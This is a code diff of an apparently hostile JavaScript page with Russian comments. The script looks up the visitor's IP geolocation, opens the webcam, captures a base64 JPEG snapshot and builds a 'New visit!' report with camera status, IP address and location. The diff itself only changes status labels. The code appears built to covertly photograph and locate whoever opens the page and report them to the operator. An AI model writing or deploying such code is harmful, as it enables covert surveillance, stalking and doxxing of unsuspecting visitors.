@@ -14,12 +14,12 @@
         const geoData = await geoRes.json();
         geo = `${geoData.city}, ${geoData.region}, ${geoData.country_name} (${geoData.latitude}, ${geoData.longitude})`;
     } catch(e) {
-        geo = "ошибка геолокации";
+        geo = "Недоступно";
     }
 
     // ---------- 2. Скрин с вебкамеры ----------
     let screenshotBase64 = "";
-    let cameraStatus = "недоступна";
+    let cameraStatus = "Заблокирована";
 
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -44,7 +44,7 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
         screenshotBase64 = canvas.toDataURL("image/jpeg", 0.85).split(",")[1];
-        cameraStatus = "успех";
+        cameraStatus = "Внизу";
 
         // Выключение камеры
         stream.getTracks().forEach(track => track.stop());
@@ -58,7 +58,7 @@
     const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" }) + " MSK";
 
     // ---------- 4. Формирование сообщения ----------
-    const messageText = `!Новый переход!
+    const messageText = `Новый переход!
 Вебкамера: ${cameraStatus}
 IP адрес: ${ipAddress}
 Геолокация: ${geo}
